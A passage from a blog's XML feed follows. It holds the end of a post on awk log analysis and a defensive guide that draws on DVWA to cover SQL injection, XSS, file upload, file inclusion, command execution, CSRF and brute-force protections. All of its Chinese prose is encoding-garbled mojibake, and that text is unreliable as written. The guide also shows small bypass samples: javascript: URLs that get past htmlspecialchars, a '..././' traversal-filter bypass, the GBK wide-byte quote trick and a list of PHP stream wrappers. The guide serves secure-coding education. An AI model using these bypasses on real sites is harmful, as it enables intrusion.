<h2 id="0x03-7-log-awk"><a href="#0x03-7-log-awk" class="headerlink" title="0x03.7 log.awk"></a>0x03.7 log.awk</h2><p>é¦–å…ˆï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œawkå°†â€\nâ€ä½œä¸ºè®°å½•çš„åˆ†éš”ç¬¦ï¼Œè®¾ç½®RS=â€â€è¡¨ç¤ºæ”¹ä¸ºå°†ç©ºè¡Œä½œä¸ºåˆ†éš”ç¬¦å…¶æ¬¡ï¼ŒNFæ˜¯ä¸€ä¸ªawkçš„å†…ç½®å˜é‡ï¼Œè¡¨ç¤ºå½“å‰è¡Œçš„å­—æ®µæ€»æ•°ã€‚ç”±äºè¾“å…¥æ–‡ä»¶ä¹‹ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½åŒ…å«ä¸¤ä¸ªå­—æ®µï¼Œç¬¬ä¸€ä¸ªæ˜¯è®¿é—®æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯ç½‘å€ï¼Œæ‰€ä»¥è¿™é‡Œåšä¸€ä¸ªæ¡ä»¶åˆ¤æ–­ï¼Œåªè¦æ˜¯å¥‡æ•°å­—æ®µå°±ç´¯åŠ ï¼Œå¶æ•°å­—æ®µåˆ™ä¸€å¾‹è·³è¿‡ã€‚æœ€åï¼Œæ¯ä¸ªè®°å½•è¾“å‡ºä¸€ä¸ªç´¯åŠ å€¼å’Œç½‘å€ï¼Œå®ƒä»¬ä¹‹é—´ç”¨ç©ºæ ¼åˆ†å‰²ã€‚</p>
<p><strong>å‚è€ƒæ–‡ç« ï¼š</strong><br><a href="http://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html" target="_blank" rel="external">http://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html</a><br><a href="http://blog.csdn.net/long2746004900/article/details/53367353" target="_blank" rel="external">http://blog.csdn.net/long2746004900/article/details/53367353</a><br><a href="http://www.cnblogs.com/wangqiguo/p/5863266.html" target="_blank" rel="external">http://www.cnblogs.com/wangqiguo/p/5863266.html</a><br><a href="http://blog.csdn.net/github_33736971/article/details/54286736" target="_blank" rel="external">http://blog.csdn.net/github_33736971/article/details/54286736</a><br><a href="http://blog.csdn.net/wenxuechaozhe/article/details/52564394" target="_blank" rel="external">http://blog.csdn.net/wenxuechaozhe/article/details/52564394</a><br><a href="http://www.cnblogs.com/dong008259/archive/2011/12/07/2279897.html" target="_blank" rel="external">http://www.cnblogs.com/dong008259/archive/2011/12/07/2279897.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> linux </tag>
            
            <tag> åº”æ€¥å“åº” </tag>
            
            <tag> æ—¥å¿—åˆ†æ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è·Ÿç€DVWAå­¦Webå®‰å…¨å¼€å‘]]></title>
      <url>/2017/07/10/%E8%B7%9F%E7%9D%80DVWA%E5%AD%A6Web%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/</url>
      <content type="html"><![CDATA[<p>æœ¬æ–‡å·²å‘å¸ƒåˆ°â€œå®‰å…¨è„‰æâ€ï¼ŒåŸæ–‡é“¾æ¥ï¼š<a href="https://www.secpulse.com/archives/59262.html" target="_blank" rel="external">https://www.secpulse.com/archives/59262.html</a></p>
<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><blockquote>
<p>DVWAï¼ˆDamn Vulnerable Web Applicationï¼‰æ˜¯ä¸€ä¸ªç”¨æ¥è¿›è¡Œå®‰å…¨è„†å¼±æ€§é‰´å®šçš„PHP/MySQL Webåº”ç”¨ï¼Œæ—¨åœ¨ä¸ºå®‰å…¨ä¸“ä¸šäººå‘˜æµ‹è¯•è‡ªå·±çš„ä¸“ä¸šæŠ€èƒ½å’Œå·¥å…·æä¾›åˆæ³•çš„ç¯å¢ƒï¼Œå¸®åŠ©webå¼€å‘è€…æ›´å¥½çš„ç†è§£webåº”ç”¨å®‰å…¨é˜²èŒƒçš„è¿‡ç¨‹ã€‚</p>
</blockquote>
<p>æœ¬æ–‡å°†ä»DVWAä¸­åŒ…å«çš„å„ç§æ¼æ´æ¥å­¦ä¹ åŸºæœ¬çš„Webå®‰å…¨å¼€å‘ä¸­çš„éœ€è¦æ³¨æ„çš„é—®é¢˜ï¼Œæœ¬æ–‡æ—¨åœ¨ä¸ºWebå¼€å‘ä¸­çš„æ–°æ‰‹æä¾›ä¸€äº›å®‰å…¨æŒ‡å—ï¼ŒæŠ›ç –å¼•ç‰ï¼Œæœ›å¤§ç‰›ä»¬å¤šå¤šæŒ‡ç‚¹ã€‚<br><a id="more"></a></p>
<h1 id="0x01-SQLæ³¨å…¥"><a href="#0x01-SQLæ³¨å…¥" class="headerlink" title="0x01 SQLæ³¨å…¥"></a>0x01 SQLæ³¨å…¥</h1><p>1ã€ä½¿ç”¨<code>mysql_real_escape_string</code>å‡½æ•°ï¼Œä¸è¦ä½¿ç”¨<code>addslashes</code><br><code>mysql_escape_string</code>å·²ç»è¢«å¼ƒç”¨ï¼Œä¸»è¦è¯´ä¸‹<code>mysql_real_escape_string</code>å’Œ<code>addslashes</code>çš„åŒºåˆ«<br>1.1 è¿™ä¸¤ä¸ªå‡½æ•°éƒ½ä¼šå¯¹<code>&#39;</code>ã€<code>&quot;</code>ã€<code>\</code>å’Œ<code>\x00</code>è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œé™¤æ­¤ä¹‹å¤–<code>mysql_real_escape_string</code>è¿˜ä¼šå¯¹<code>\r</code>ã€<code>\n</code>å’Œ<code>\x1a</code>è¿›è¡Œè½¬ä¹‰ã€‚<br>1.2 åœ¨å­—ç¬¦é›†ä¸ºGBKæ—¶ï¼Œ<code>0xbf27</code>ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„å¤šå­—èŠ‚å­—ç¬¦ï¼Œä½†<code>0xbf5c</code>å´æ˜¯,è‹¥æˆ‘ä»¬è¾“å…¥<code>0xbf27</code>addslashesä¼šå°†å®ƒä¿®æ”¹ä¸º<code>0xbf5c27</code>ï¼Œ<code>0xbf5c</code>ä¼šè¢«å½“ä½œå•å­—èŠ‚å­—ç¬¦ï¼Œæ‰€ä»¥æˆåŠŸæ³¨å…¥ä¸€ä¸ªå•å¼•å·ï¼Œè¿™å°±æ˜¯å®½å­—èŠ‚æ³¨å…¥ã€‚<br>2ã€ä½¿ç”¨<code>is_numeric</code>å‡½æ•°ï¼Œä½†æ˜¯å¦‚æœå•ä½¿ç”¨<code>is_numeric</code>å‡½æ•°æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºä½¿ç”¨åå…­è¿›åˆ¶ã€ç§‘å­¦è®°æ•°æ³•å³å¯è½»æ¾ç»•è¿‡ã€‚<br>3ã€ä½¿ç”¨PDOæŠ€æœ¯ï¼ŒPDOæ˜¯PHPæ•°æ®å¯¹è±¡ï¼ˆPHP Data Objectï¼‰çš„ç¼©å†™ï¼Œå³ä½¿ç”¨å®ƒçš„å‡†å¤‡è¯­å¥ï¼ˆPrepared Statementsï¼Œå³â€œå‚æ•°åŒ–æŸ¥è¯¢â€ï¼‰ã€‚ä¸¾ä¸ªä¾‹å­ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$Statement = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;);</div><div class="line">$id = 18;</div><div class="line">$name = &apos;w2n1ck&apos;;</div><div class="line">$Statement-&gt;bindParam(1,$id);</div><div class="line">$Statement-&gt;bindParam(2,$name);</div><div class="line">$Statement-&gt;execute();</div><div class="line">$Statement-&gt;fetchAll();</div></pre></td></tr></table></figure></p>
<p>PHPä¼šå°†å°†SQLæ¨¡æ¿<code>select * from info where id =? and name = ?</code>å’Œå˜é‡bindParam(1,$id);bindParam(2,$name);åˆ†ä¸¤æ¬¡å‘é€ç»™MySQLï¼Œç”±MySQLå®Œæˆå˜é‡çš„è½¬ä¹‰å¤„ç†ï¼Œç„¶åè¿›è¡Œå‚æ•°å­—ç¬¦ä¸²åŒ¹é…å³å¯ã€‚<br>(PSï¼šä¹‹å‰è¿˜äº†è§£äº†è¯­ä¹‰åˆ†æé˜²SQLæ³¨å…¥ï¼Œä¸€ç›´è§‰å¾—PDOå¾ˆå¥½äº†ï¼Œä¸ºå•¥è¿˜è¦è¯­ä¹‰åˆ†æï¼Œåæ¥æ‰æç„¶å¤§æ‚Ÿï¼ŒPDOæ˜¯å¯¹å¼€å‘çš„ï¼Œè¯­ä¹‰åˆ†æäººå®¶æ˜¯ä¸ºäº†å–äº§å“ï¼Œmdzz)<br>4ã€DVWAé‡Œé¢è¿˜åŠ äº†<code>Anti-CSRF token</code>éªŒè¯ï¼Œè¿›ä¸€æ­¥æé«˜äº†ç³»ç»Ÿå®‰å…¨æ€§</p>
<h1 id="0x02-XSS-è·¨ç«™è„šæœ¬"><a href="#0x02-XSS-è·¨ç«™è„šæœ¬" class="headerlink" title="0x02 XSS(è·¨ç«™è„šæœ¬)"></a>0x02 XSS(è·¨ç«™è„šæœ¬)</h1><p>DVWAä¸­XSSé˜²æŠ¤æµç¨‹æ­¥éª¤ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</div><div class="line">Sanitize message input</div><div class="line">$message = stripslashes( $message );</div><div class="line">$message = mysql_real_escape_string( $message );</div><div class="line">$message = htmlspecialchars( $message );</div></pre></td></tr></table></figure></p>
<p>1ã€ä½¿ç”¨trimå‡½æ•°ï¼Œtrimå‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚å› ä¸ºæœ‰æ—¶å€™æˆ‘ä»¬ä¼šä½¿ç”¨<code>\tã€\nã€\r&quot;</code>ç­‰å°è¯•ç»•è¿‡ã€‚<br>2ã€ä½¿ç”¨stripslashes,åˆ é™¤ç”± addslashes()å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚<br>3ã€ä½¿ç”¨<code>mysql_real_escape_string</code>è½¬ä¹‰ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ã€‚<br>4ã€ä½¿ç”¨htmlspecialcharsæŠŠç‰¹æ®Šå­—ç¬¦<code>&amp;,&quot;,&#39;,&lt;,&gt;</code>æ›¿æ¢ä¸ºHTMLå®ä½“<code>&amp;amp;&amp;quot;&amp;#039;&amp;lt;&amp;gt;</code>,ä½†æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ç¼–ç çš„æ–¹å¼ç»•è¿‡å‡½æ•°è¿›è¡ŒXSSæ³¨å…¥ï¼Œå°¤å…¶æ˜¯DOMå‹çš„XSS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;</div><div class="line">&lt;?php echo htmlspecialchars(&quot;javascript:alert(1)&quot;,ENT_QUOTES); ?&gt;</div><div class="line">&quot;&gt;test&lt;/a&gt;</div><div class="line">&lt;a href=&quot;</div><div class="line">&lt;?php echo htmlspecialchars(&quot;javascript:location%3Dhttp%3A%2F%2Fwww.baidu.com&quot;,ENT_QUOTES); ?&gt;</div><div class="line">&quot;&gt;test&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>æ€»ç»“ï¼šå¯¹è¾“å…¥(URLå‚æ•°)è¿›è¡Œè¿‡æ»¤ï¼›å¯¹è¾“å‡ºè¿›è¡Œç¼–ç ï¼›ç™½åå•å’Œé»‘åå•ç»“åˆï¼›</p>
<h1 id="0x03-æ–‡ä»¶ä¸Šä¼ "><a href="#0x03-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x03 æ–‡ä»¶ä¸Šä¼ "></a>0x03 æ–‡ä»¶ä¸Šä¼ </h1><p>DVWAä¸­æ–‡ä»¶å®‰å…¨ä¸Šä¼ çš„æµç¨‹ï¼š</p>
<h2 id="1ã€å–æ–‡ä»¶æœ€åçš„æ‰©å±•å"><a href="#1ã€å–æ–‡ä»¶æœ€åçš„æ‰©å±•å" class="headerlink" title="1ã€å–æ–‡ä»¶æœ€åçš„æ‰©å±•å"></a>1ã€å–æ–‡ä»¶æœ€åçš„æ‰©å±•å</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);</div></pre></td></tr></table></figure>
<h2 id="2ã€å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶ååšéšæœºæ•°é‡å‘½åæ“ä½œ"><a href="#2ã€å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶ååšéšæœºæ•°é‡å‘½åæ“ä½œ" class="headerlink" title="2ã€å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶ååšéšæœºæ•°é‡å‘½åæ“ä½œ"></a>2ã€å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶ååšéšæœºæ•°é‡å‘½åæ“ä½œ</h2><p>DVWAç”¨çš„æ˜¯MD5ï¼Œrand()å‡½æ•°ä¹Ÿå¯ä»¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;</div></pre></td></tr></table></figure></p>
<h2 id="3ã€é‡‡å–ç™½åå•æ–¹å¼éªŒè¯æ–‡ä»¶çš„åç¼€åï¼ŒMIME-TYPEç±»å‹ï¼Œä»¥åŠæ–‡ä»¶å¤§å°"><a href="#3ã€é‡‡å–ç™½åå•æ–¹å¼éªŒè¯æ–‡ä»¶çš„åç¼€åï¼ŒMIME-TYPEç±»å‹ï¼Œä»¥åŠæ–‡ä»¶å¤§å°" class="headerlink" title="3ã€é‡‡å–ç™½åå•æ–¹å¼éªŒè¯æ–‡ä»¶çš„åç¼€åï¼ŒMIME-TYPEç±»å‹ï¼Œä»¥åŠæ–‡ä»¶å¤§å°"></a>3ã€é‡‡å–ç™½åå•æ–¹å¼éªŒè¯æ–‡ä»¶çš„åç¼€åï¼ŒMIME-TYPEç±»å‹ï¼Œä»¥åŠæ–‡ä»¶å¤§å°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;</div><div class="line">    ( $uploaded_size &lt; 100000 ) &amp;&amp;</div><div class="line">    ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos;</div></pre></td></tr></table></figure>
<h2 id="4ã€æ£€æŸ¥æ˜¯å¦ä¸ºçœŸæ­£å›¾ç‰‡"><a href="#4ã€æ£€æŸ¥æ˜¯å¦ä¸ºçœŸæ­£å›¾ç‰‡" class="headerlink" title="4ã€æ£€æŸ¥æ˜¯å¦ä¸ºçœŸæ­£å›¾ç‰‡"></a>4ã€æ£€æŸ¥æ˜¯å¦ä¸ºçœŸæ­£å›¾ç‰‡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getimagesize( $uploaded_tmp )</div></pre></td></tr></table></figure>
<h2 id="5ã€ä½¿ç”¨GDåº“æˆ–image-magickè¿›è¡ŒäºŒæ¬¡æ¸²æŸ“"><a href="#5ã€ä½¿ç”¨GDåº“æˆ–image-magickè¿›è¡ŒäºŒæ¬¡æ¸²æŸ“" class="headerlink" title="5ã€ä½¿ç”¨GDåº“æˆ–image-magickè¿›è¡ŒäºŒæ¬¡æ¸²æŸ“"></a>5ã€ä½¿ç”¨GDåº“æˆ–<code>image-magick</code>è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“</h2><p>äºŒæ¬¡æ¸²æŸ“ï¼Œæ¸…é™¤å›¾ç‰‡ä¸­çš„æ¶æ„ä»£ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$img = imagecreatefromjpeg( $uploaded_tmp );</div></pre></td></tr></table></figure></p>
<h2 id="6ã€å›æ˜¾ç›¸å¯¹è·¯å¾„"><a href="#6ã€å›æ˜¾ç›¸å¯¹è·¯å¾„" class="headerlink" title="6ã€å›æ˜¾ç›¸å¯¹è·¯å¾„"></a>6ã€å›æ˜¾ç›¸å¯¹è·¯å¾„</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) )</div></pre></td></tr></table></figure>
<p>DVWAä¸­åªæ˜¯ä»ä»£ç è®¾è®¡å±‚é¢è€ƒè™‘æ–‡ä»¶ä¸Šä¼ çš„å®‰å…¨æ€§ï¼Œæ¯”å¦‚è¿˜æœ‰Nginxä¸Apacheçš„è§£ææ¼æ´ï¼Œæˆªæ–­é—®é¢˜ï¼Œ<code>.htaccess,.user.ini</code>åé—¨,windowsç‰¹æ€§ï¼ŒADSæµï¼ŒRTLOæŠ€æœ¯ï¼ŒåŒ…å«æ¼æ´ç­‰ç­‰ã€‚</p>
<h1 id="0x04-æ–‡ä»¶åŒ…å«"><a href="#0x04-æ–‡ä»¶åŒ…å«" class="headerlink" title="0x04 æ–‡ä»¶åŒ…å«"></a>0x04 æ–‡ä»¶åŒ…å«</h1><p>DVWAä¸­çš„æ–‡ä»¶åŒ…å«ç›´æ¥å†™æ­»äº†å°±é‚£å‡ ä¸ªæ–‡ä»¶ï¼Œç®€å•ç²—æš´ã€‚ã€‚ã€‚</p>
<p>è¿™é‡Œä¸¾ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p>
<ol>
<li>ä½¿ç”¨<code>open_basedir</code>é…ç½®ï¼Œé™åˆ¶æ–‡ä»¶ç›®å½•</li>
<li>è¿‡æ»¤<code>./</code>,æ³¨æ„ä¸æ˜¯<code>../</code>ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨<code>..././..././</code>ç»•è¿‡</li>
<li>ç¦æ­¢æœåŠ¡å™¨è¿œç¨‹æ–‡ä»¶åŒ…å«,allow_url_fopen=Offä¸allow_url_include=Off</li>
<li>æ³¨æ„<code>php://input</code>,<code>data://</code>ç­‰å„ç§ä¼ªåè®®é—®é¢˜</li>
<li>æ³¨æ„æˆªæ–­é—®é¢˜ï¼Œæ¯”å¦‚<code>%00</code>æˆªæ–­,è¶…é•¿è·¯å¾„æˆªæ–­ï¼Œç‚¹å·æˆªæ–­<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">file:///var/www/html  è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</div><div class="line">ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt;   è®¿é—®FTP(s) URLs</div><div class="line">data://  æ•°æ®æµ</div><div class="line">http:// â€” è®¿é—® HTTP(s) URLs</div><div class="line">php://input â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµ</div><div class="line">zlib:// â€” å‹ç¼©æµ</div><div class="line">glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</div><div class="line">phar:// â€” PHP Archive</div><div class="line">ssh2:// â€” Secure Shell 2</div><div class="line">rar:// â€” RAR</div><div class="line">ogg:// â€” Audio streams</div><div class="line">expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ</div><div class="line">php://filter/</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="0x05-å‘½ä»¤æ‰§è¡Œ"><a href="#0x05-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x05 å‘½ä»¤æ‰§è¡Œ"></a>0x05 å‘½ä»¤æ‰§è¡Œ</h1><p>DVWAä¸­æ˜¯ä»¥pingå‘½ä»¤ä¸ºä¾‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$octet = explode( &quot;.&quot;, $target ); //ä»¥ç‚¹å·è¿›è¡Œåˆ†å‰²</div><div class="line">if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) //åˆ¤æ–­æ¯ä¸ªéƒ¨åˆ†æ˜¯å¦æ˜¯æ•°å­—ï¼ŒåŒæ—¶sizeæ˜¯å¦ä¸º4</div></pre></td></tr></table></figure></p>
<p>è¿™é‡Œä¸¾ä¸€äº›éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p>
<p>1.å°½é‡å°‘ç”¨æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æˆ–è€…ç›´æ¥ç¦ç”¨<br>2.å‚æ•°å€¼å°½é‡ä½¿ç”¨å¼•å·åŒ…è£¹<br>3.åœ¨ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰ï¼Œç¡®ä¿ä½¿ç”¨çš„å‡½æ•°æ˜¯æŒ‡å®šçš„å‡½æ•°ä¹‹ä¸€<br>4.åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€æ–¹æ³•ä¹‹å‰ï¼Œå¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼ŒPHPä¸­ä½¿ç”¨<code>escapeshellcmd</code>å‡½æ•°</p>
<pre><code>escapeshellcmdå¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª—shellå‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ°exec()æˆ–system()å‡½æ•°ï¼Œæˆ–è€…æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚
ç‰¹æ®Šå­—ç¬¦æœ‰`#,&amp;,;åå¼•å·,|,*,?,~,&lt;,&gt;,^,(,),[,],{,},$,x0A,x00å’ŒxFF`ã€‚&apos;å’Œ&quot;ä»…åœ¨ä¸é…å¯¹çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚åœ¨Windowså¹³å°ä¸Šä»¥å‰ç¼€`^`æ¥è½¬ä¹‰çš„
</code></pre><h1 id="0x06-CSRF-è·¨ç«™è¯·æ±‚ä¼ªé€ "><a href="#0x06-CSRF-è·¨ç«™è¯·æ±‚ä¼ªé€ " class="headerlink" title="0x06 CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )"></a>0x06 CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )</h1><p>DVWAä¸­çš„CSRFæ˜¯ä»¥æ”¹å¯†ç ä¸ºä¾‹ã€‚</p>
<h2 id="1ã€éªŒè¯token"><a href="#1ã€éªŒè¯token" class="headerlink" title="1ã€éªŒè¯token"></a>1ã€éªŒè¯token</h2><p>è¿™æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ•ˆçš„æ‰‹æ®µï¼Œç”¨æˆ·æ¯æ¬¡è®¿é—®æ”¹å¯†é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªéšæœºçš„tokenï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéœ€è¦æäº¤tokenå‚æ•°ï¼Œè€ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šä¼˜å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰tokenæ­£ç¡®ï¼Œæ‰ä¼šå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// Check Anti-CSRF token</div><div class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</div></pre></td></tr></table></figure></p>
<h2 id="2ã€äºŒæ¬¡ç¡®è®¤"><a href="#2ã€äºŒæ¬¡ç¡®è®¤" class="headerlink" title="2ã€äºŒæ¬¡ç¡®è®¤"></a>2ã€äºŒæ¬¡ç¡®è®¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">// Get input</div><div class="line">$pass_curr = $_GET[ &apos;password_current&apos; ];</div><div class="line">...</div><div class="line">// Check that the current password is correct</div><div class="line">$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</div><div class="line">$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</div><div class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );</div><div class="line">$data-&gt;execute();</div><div class="line">// Do both new passwords match and does the current password match the user?</div><div class="line">if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) )&#123;&#125;</div></pre></td></tr></table></figure>
<p>äºŒæ¬¡ç¡®è®¤å°±æ˜¯åœ¨è°ƒç”¨æŸäº›åŠŸèƒ½æ—¶è¿›è¡ŒäºŒæ¬¡éªŒè¯ï¼Œå¦‚ï¼šåˆ é™¤ç”¨æˆ·æ—¶ï¼Œäº§ç”Ÿä¸€ä¸ªæç¤ºå¯¹è¯æ¡†ï¼Œæç¤ºâ€ç¡®å®šåˆ é™¤ç”¨æˆ·å—ï¼Ÿâ€,è½¬è´¦æ“ä½œæ—¶ï¼Œè¦æ±‚ç”¨æˆ·è¾“å…¥äºŒæ¬¡å¯†ç ã€‚</p>
<h2 id="3ã€éªŒè¯ç "><a href="#3ã€éªŒè¯ç " class="headerlink" title="3ã€éªŒè¯ç "></a>3ã€éªŒè¯ç </h2><p>è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€å•å¹¶ä¸”æœ‰æ•ˆçš„é˜²å¾¡CSRFçš„æ–¹æ³•ã€‚</p>
<h1 id="0x07-æš´åŠ›ç ´è§£"><a href="#0x07-æš´åŠ›ç ´è§£" class="headerlink" title="0x07 æš´åŠ›ç ´è§£"></a>0x07 æš´åŠ›ç ´è§£</h1><h2 id="1ã€å¢åŠ éªŒè¯ç ï¼Œtokenç­‰éªŒæ ¡å­—æ®µ"><a href="#1ã€å¢åŠ éªŒè¯ç ï¼Œtokenç­‰éªŒæ ¡å­—æ®µ" class="headerlink" title="1ã€å¢åŠ éªŒè¯ç ï¼Œtokenç­‰éªŒæ ¡å­—æ®µ"></a>1ã€å¢åŠ éªŒè¯ç ï¼Œtokenç­‰éªŒæ ¡å­—æ®µ</h2><p>DVWAä¸­åŠ å…¥äº†Anti-CSRFtokené¢„é˜²æ— è„‘çˆ†ç ´ã€‚</p>
<h2 id="2ã€å¢åŠ sleepæ“ä½œ"><a href="#2ã€å¢åŠ sleepæ“ä½œ" class="headerlink" title="2ã€å¢åŠ sleepæ“ä½œ"></a>2ã€å¢åŠ sleepæ“ä½œ</h2><p>åªè¦ç™»é™†å¤±è´¥ï¼Œåˆ™å»¶è¿Ÿ3ç§’ï¼Œå¤§å¤§é™ä½äº†çˆ†ç ´é€Ÿåº¦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// Login failed</div><div class="line">sleep( rand( 2, 4 ) );</div></pre></td></tr></table></figure></p>
<h2 id="3ã€å¢åŠ ç™»é™†é”™è¯¯æœºåˆ¶"><a href="#3ã€å¢åŠ ç™»é™†é”™è¯¯æœºåˆ¶" class="headerlink" title="3ã€å¢åŠ ç™»é™†é”™è¯¯æœºåˆ¶"></a>3ã€å¢åŠ ç™»é™†é”™è¯¯æœºåˆ¶</h2><p>å•ç”¨æˆ·ï¼Œç™»é™†æ¬¡æ•°é”™è¯¯åˆ°ä¸€å®šæ¬¡æ•°ï¼Œå³é”å®šè¯¥è´¦æˆ·ã€‚æ­¤å¤–è¿˜å¯ä»¥å¯¹ç”¨æˆ·IPç­‰è¿›è¡Œé¢‘æ¬¡é™åˆ¶ã€‚</p>
